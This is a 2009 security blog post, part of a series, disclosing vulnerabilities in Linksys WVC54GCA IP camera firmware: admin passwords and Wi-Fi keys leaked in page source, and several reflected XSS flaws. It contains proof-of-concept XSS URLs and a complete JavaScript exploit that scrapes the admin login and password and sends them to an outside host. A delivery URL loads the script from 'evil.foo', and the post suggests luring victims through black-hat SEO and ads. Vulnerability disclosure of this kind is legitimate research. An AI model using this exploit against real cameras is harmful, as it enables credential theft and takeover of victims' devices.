---
title: Hacking Linksys IP Cameras (pt 4)
author: adrian-pastor
date: Sat, 25 Apr 2009 03:28:38 GMT
template: post.jade
category: fucked
---

_This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: [Hacking Linksys IP Cameras (pt 1)](/blog/hacking-linksys-ip-cameras-pt-1/), [Hacking Linksys IP Cameras (pt 2)](/blog/hacking-linksys-ip-cameras-pt-2/), [Hacking Linksys IP Cameras (pt 3)](/blog/hacking-linksys-ip-cameras-pt-3/)._

There are two types of vulnerabilities I will be releasing today: disclosure of credentials in client-side source code and multiple XSS.

### Disclosure of Credentials in Client-side Source Code

As a consumer of embedded products, I find highly frustrating to see how many devices' web interfaces return passwords back to the browser within HTML source code. I've also seen similar problems in some corporate appliances, but is not such as common problem within the enterprise realm.

Visiting the change admin password page:

    /adm/file.cgi?next_file=pass_wd.htm

    Causes the current admin password to be returned (just view the source code with your browser):

    <input type="password" size="8" maxlength="64" name="admpw" value="**C4mP4ssw0rd**" onKeyDown="chkPsize(this.value.length,64,msg_bigpw)"></pre>`

    Visiting the "Wireless Security Page":

    /adm/file.cgi?next_file=Wsecurity.htm

    Causes the Wi-Fi WEP/WPA/WPA2 encryption key to be returned to the browser:

    <input type="text" name="psk" size="24" maxlength="63" value="**mywirelesskey**">

    Obviously this is bad news, as it means that every time the aforementioned pages are visited, credentials travel the clear (the WVC54GCA IP camera doesn't have SSL/TLS support).

    Now, I know there are people out there who might find these types of issues not worth fixing. The following is the thinking behind their reasoning.

    In the case of the admin password disclosure, some people would argue that this issue wouldn't make a difference security-wise, since the camera uses [basic authentication](http://en.wikipedia.org/wiki/Basic_access_authentication) which transmits credentials in the clear (base64 encoding) anyway.

    In the case of the wireless encryption key disclosure, some individuals point out that if you can sniff the Wi-Fi encryption key, it means that either 1) you're already part of the wireless network which means you must already know the key, or 2) you are part of the network via an ethernet connection which means that you don't need the wireless key at all.

    So why fix these issues then? Well, think of client-side attacks for instance. If you keep reading I'll show you how you can (for instance) use XSS to steal the admin password from the aforementioned page. If the admin password wasn't returned by the web interface, this attack would not be possible, despite basic authentication being used by the camera.

    ### Several XSS bugs

    Yes, XSS is the roach of the Internet, it's everywhere and we can't seem to be able to get rid of it! Of course, Linksys IP cameras are no exception. Finding XSS vulns requires virtually no skills (unless you are trying to bypass a strict filter logic). Also, hunting for XSS vulns can be kind of boring. As pdp usually says, "it's not finding XSS bugs which is interesting, but what you can do with it". I couldn't agree more.

    Boring PoCs:

    /main.cgi?next_file=%3Cimg%20src%3dx%20onerror%3dalert(1)%3E
    /img/main.cgi?next_file=%3Cimg%20src%3dx%20onerror%3dalert(1)%3E
    /adm/file.cgi?next_file=%3Cscript%3Ealert(1)%3C/script%3E
    /adm/file.cgi?todo=xss&this_file=%3cscript%3ealert(1)%3c/script%3e</pre>`

    XSS bug #1 works regardless of the authentication state of the victim user. The rest do require the victim user to be logged-in for the injected JS to run within the context of the camera's domain sandbox.

    As you can see in the first two XSS vulns, we use `img` tags, rather then `script` tags, due to closing `script` tags being filtered. Once again, the developers have chosen to perform filtering against some parameters, albeit poor filtering.

    #### Admin Password theft XSS PoC

    The following is the PoC exploit which steals the admin user's password.

    // **evil.js** : malicious JS file, typically located on attacker's site
    // payload description: steals Linksys WVC54GCA admin password via XSS
    // tested on FF3 and IE7
    // based on code from developer.apple.com
    function loadXMLDoc(url) {
    	req = false;
        	// branch for native XMLHttpRequest object
        	if(window.XMLHttpRequest && !(window.ActiveXObject)) {
        		try {	
    			req = new XMLHttpRequest();
            	} 
    		catch(e) {
    			req = false;
            	}
        	} 
        	// branch for IE/Windows ActiveX version	
    	else if(window.ActiveXObject) {
           		try { 
            		req = new ActiveXObject("Msxml2.XMLHTTP");
          		} 
    		catch(e)  {
            		try {
              			req = new ActiveXObject("Microsoft.XMLHTTP");
            		} 
    			catch(e) {
              			req = false;
            		}
    		}
        	}
    	if(req) {
    		req.onreadystatechange = processReqChange;
    		req.open("GET", url, true);
    		req.send("");
    	}
    }
    // end of loadXMLDoc(url)

    function processReqChange() {
       	// only if req shows "loaded"
        	if (req.readyState == 4) {
            	// only if "OK"
            	if (req.status == 200) { 
    			// dirty credentials-scraping code
    			var bits=req.responseText.split(/\"/);	
    			var gems="";
    			for (i=0;i<bits.length;++i) { 
                                    if(bits[i]=="adm" && bits[i+1]==" value=") {      
                                   		gems+="login="; 
    					gems+=bits[i+2];
                                    }
                                    if(bits[i]=="admpw" && bits[i+1]==" value=") {      
                                           	gems+='&password='; 
    					gems+=bits[i+2];    
                                    }
    			}
    			alert(gems); // this line is for demo purposes only and would be removed in a real attack
    			c=new Image();
    			c.src='http://google.com/x.php?'+gems; // URL should point to data-theft script on attacker's site
            	} 
        	}
    }

    var url="/adm/file.cgi?next_file=pass_wd.htm";
    loadXMLDoc(url);

    http://192.168.1.115/adm/file.cgi?next_file=%3cscript%20src=http://evil.foo/**evil.js**%3e%3c/script%3e

If you capture the traffic while testing the exploit against yourself you will see the admin login and password being sent to google.com:

<div class="screen">![Screenshot eth1 Capturing Wireshark 1](/files/2009/04/screenshot-eth1-capturing-wireshark1.png "Screenshot eth1 Capturing Wireshark 1")</div>

#### Attack Requirements

In order for this exploit to work, the camera admin user must be logged in when the attack occurs. This means that a bit of social engineering is required. For instance, the attacker could setup a forum to help users of the WVC54GCA camera by providing tips, FAQs, etc. If the attacker is serious he could use [black hat SEO](http://www.timesonline.co.uk/tol/driving/article754974.ece) and ad campaigns such as Google AdWords to attract Linksys camera users to visit the site containing the malicious XSS URLs. You get the idea!

### Testing Info

All Disclosure of Credentials and XSS vulnerabilities successfully tested on:

* WVC54GCA
* Firmware V1.00R22 and V1.00R24 (latest available as on 23rd April 2009)
